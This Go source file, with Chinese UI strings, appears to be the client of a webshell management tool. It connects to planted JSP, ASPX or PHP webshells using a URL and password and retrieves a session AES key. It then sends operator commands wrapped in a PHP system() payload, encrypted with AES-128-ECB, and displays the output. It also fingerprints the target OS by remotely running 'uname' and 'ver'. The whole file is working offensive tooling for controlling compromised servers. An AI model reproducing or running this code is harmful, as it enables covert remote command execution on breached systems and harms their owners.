package main

import (
	"bytes"
	"crypto/aes"
	"encoding/base64"
	"fmt"
	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/widget"
	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
	"io/ioutil"
	"net/http"
	"strings"
)

var Osinfo string

var AESkey string
var sessionID string
var url string

func showConnectPage(w fyne.Window) {

	urlEntry := widget.NewEntry()
	urlEntry.SetPlaceHolder("Enter URL...")

	passEntry := widget.NewEntry()
	passEntry.SetPlaceHolder("Enter pass...")

	combo := widget.NewSelect([]string{"JSP+", "ASPX+", "PHP+"}, func(selected string) {
		selectedType = selected
	})

	connectButton := widget.NewButton("连接", func() {

		url := urlEntry.Text
		password := passEntry.Text

		fmt.Println(selectedType)
		if selectedType == "JSP+" {
			JSPEConnection(w, url, password)
		} else if selectedType == "ASPX+" {

			go func() {
				resp, err := http.Get(url + "?pass=" + password)
				if err != nil {
					fmt.Println(fmt.Sprintf("请求失败: %v", err))
					return
				}
				defer resp.Body.Close()

				body, err := ioutil.ReadAll(resp.Body)
				if err != nil {
					fmt.Println(fmt.Sprintf("读取响应失败: %v", err))
					return
				}

				sessionID = resp.Header.Get("Set-Cookie")
				fmt.Printf("sessionID:%s\n", sessionID)
				if sessionID == "" {
					fmt.Println("未能获取会话ID")
				}

				AESkey = string(body)
				fmt.Printf("获取到的key为：%s\n", AESkey)

				addConnection(url, password, selectedType)
				showCommandPage3(w, url, AESkey, sessionID)
			}()
		} else if selectedType == "PHP+" {

			go func() {
				resp, err := http.Get(url + "?pass=" + password)
				if err != nil {
					fmt.Println(fmt.Sprintf("请求失败: %v", err))
					return
				}
				defer resp.Body.Close()

				body, err := ioutil.ReadAll(resp.Body)
				if err != nil {
					fmt.Println(fmt.Sprintf("读取响应失败: %v", err))
					return
				}

				sessionID = resp.Header.Get("Set-Cookie")
				if sessionID == "" {
					fmt.Println("未能获取会话ID")
				}

				AESkey = string(body)
				fmt.Println(AESkey)

				addConnection(url, password, selectedType)
				showCommandPage2(w, url, AESkey, sessionID, password)
			}()
		}
		// 刷新侧边栏数据
		showSidebar(w)
	})

	responseLabel := widget.NewLabel("")

	backButton := widget.NewButton("返回主页", func() {
		w.SetContent(mainPage())
	})

	content := container.NewVBox(
		urlEntry,
		passEntry,
		combo,
		connectButton,
		backButton,
		responseLabel,
	)

	w.SetContent(content)
}
func showCommandPage2(w fyne.Window, url string, AESkey string, sessionID string, password string) {

	commandEntry := widget.NewEntry()
	commandEntry.SetPlaceHolder("Enter command...")

	responseText := widget.NewMultiLineEntry()
	responseText.SetPlaceHolder("Response will be shown here")
	responseText.Wrapping = fyne.TextWrapWord

	scrollContainer := container.NewScroll(responseText)
	scrollContainer.SetMinSize(fyne.NewSize(400, 300))

	Osinfo = detecteOSX(url, password)
	fmt.Printf("osinfo:%s", Osinfo)
	osLabel := widget.NewLabel("Detecting OS...")
	osLabel.SetText(fmt.Sprintf("OS: %s", Osinfo))

	sendButton := widget.NewButton("发送命令", func() {
		command1 := commandEntry.Text
		if Osinfo == "Windows" {
			command1 = strings.ReplaceAll(command1, `\`, `\\`)
		}

		command := fmt.Sprintf(`hello | system("%s");`, command1)
		go func() {
			encrypted, err := encryptAES128ECB([]byte(command), []byte(AESkey))
			if err != nil {
				responseText.SetText(fmt.Sprintf("加密数据时出错，可能是密码不正确: %v", err))
				return
			}

			postData := encrypted
			fmt.Println(url)
			req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(postData)))
			if err != nil {
				responseText.SetText(fmt.Sprintf("创建POST请求时出错: %v", err))
				return
			}
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			req.Header.Set("Cookie", sessionID)
			fmt.Println("Post Data: ", postData)
			client := &http.Client{}
			resp, err := client.Do(req)
			if err != nil {
				responseText.SetText(fmt.Sprintf("POST请求失败: %v", err))
				return
			}
			defer resp.Body.Close()

			postRespBody, err := ioutil.ReadAll(resp.Body)
			fmt.Println(1)
			if err != nil {
				responseText.SetText(fmt.Sprintf("读取POST响应失败: %v", err))
				return
			}

			if Osinfo == "Windows" {
				// 转换GBK编码到UTF-8
				utf8Body, _, err := transform.String(simplifiedchinese.GBK.NewDecoder(), string(postRespBody))
				if err != nil {
					// 如果转换失败，在输出框中显示错误信息
					return
				}
				responseText.SetText(fmt.Sprintf("%s", string(utf8Body)))
			} else {
				responseText.SetText(fmt.Sprintf("%s", string(postRespBody)))
			}

		}()

	})

	backButton := widget.NewButton("返回主页", func() {
		w.SetContent(firstPage())
	})

	content := container.NewVBox(
		commandEntry,
		sendButton,
		scrollContainer,
		osLabel,
		backButton,
	)

	w.SetContent(content)
}

func encryptAES128ECB(data, key []byte) (string, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	blockSize := block.BlockSize()
	data = pkcs7Padding(data, blockSize)
	encrypted := make([]byte, len(data))
	for start := 0; start < len(data); start += blockSize {
		block.Encrypt(encrypted[start:start+blockSize], data[start:start+blockSize])
	}

	return base64.StdEncoding.EncodeToString(encrypted), nil
}

func pkcs7Padding(data []byte, blockSize int) []byte {
	padding := blockSize - len(data)%blockSize
	padText := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(data, padText...)
}

func PHPEConnection(w fyne.Window, url string, password string) {
	go func() {
		resp, err := http.Get(url + "?pass=" + password)
		if err != nil {
			fmt.Println(fmt.Sprintf("请求失败: %v", err))
			return
		}
		defer resp.Body.Close()

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			fmt.Println(fmt.Sprintf("读取响应失败: %v", err))
			return
		}

		sessionID = resp.Header.Get("Set-Cookie")
		if sessionID == "" {
			fmt.Println("未能获取会话ID")
			sessionID = "xxxx"
		}

		AESkey = string(body)
		fmt.Println(AESkey)

		showCommandPage2(w, url, AESkey, sessionID, password)
	}()
}

func detecteOSX(url string, password string) string {
	resp, err := http.Get(url + "?pass=" + password)
	if err != nil {
		fmt.Println(fmt.Sprintf("请求失败: %v", err))
		return "Unknown"
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println(fmt.Sprintf("读取响应失败: %v", err))
		return "Unknown"
	}

	sessionID = resp.Header.Get("Set-Cookie")
	if sessionID == "" {
		fmt.Println("未能获取会话ID")
	}
	AESkey = string(body)
	fmt.Printf("ASEkey2:%s\n", AESkey)
	fmt.Printf("sessionID2:%s\n", sessionID)
	command := "hello | system('uname');"
	encrypted, err := encryptAES128ECB([]byte(command), []byte(AESkey))
	fmt.Printf("ency:%s\n", encrypted)
	postData := encrypted
	fmt.Println(url)
	req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(postData)))
	if err != nil {

	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Cookie", sessionID)
	fmt.Println("Post Data: ", postData)
	client := &http.Client{}
	resp, err = client.Do(req)
	if err != nil {
		return "Unknown"
	}
	defer resp.Body.Close()

	postRespBody, err := ioutil.ReadAll(resp.Body)
	fmt.Printf("resp1:%s\n", postRespBody)

	if err != nil {
		return "Unknown"
	}
	responseStr := string(postRespBody)
	if strings.Contains(responseStr, "Linux") {
		return string("Linux")
	}
	command = "hello | system('ver');"
	encrypted, err = encryptAES128ECB([]byte(command), []byte(AESkey))
	fmt.Printf("ency:%s\n", encrypted)
	postData = encrypted
	req, err = http.NewRequest("POST", url, bytes.NewBuffer([]byte(postData)))
	if err != nil {

	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Cookie", sessionID)
	fmt.Println("Post Data: ", postData)
	client = &http.Client{}
	resp, err = client.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()

	postRespBody, err = ioutil.ReadAll(resp.Body)
	fmt.Printf("resp1:%s\n", postRespBody)

	if err != nil {
		return ""
	}
	responseStr = string(postRespBody)
	if strings.Contains(responseStr, "Windows") {
		return string("Windows")
	}

	return string("Unknown")
}

func PHPEConnection1(url string, password string) (string, string) {
	resp, err := http.Get(url + "?pass=" + password)
	if err != nil {
		fmt.Println(fmt.Sprintf("请求失败: %v", err))
		return "", ""
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println(fmt.Sprintf("读取响应失败: %v", err))
		return "", ""
	}

	sessionID := resp.Header.Get("Set-Cookie")
	if sessionID == "" {
		fmt.Println("未能获取会话ID")
		sessionID = "xxxx"
	}

	AESkey := string(body)
	fmt.Println(AESkey)

	Osinfo = detecteOSX(url, password)
	fmt.Printf("osinfo:%s", Osinfo)
	return AESkey, sessionID
}
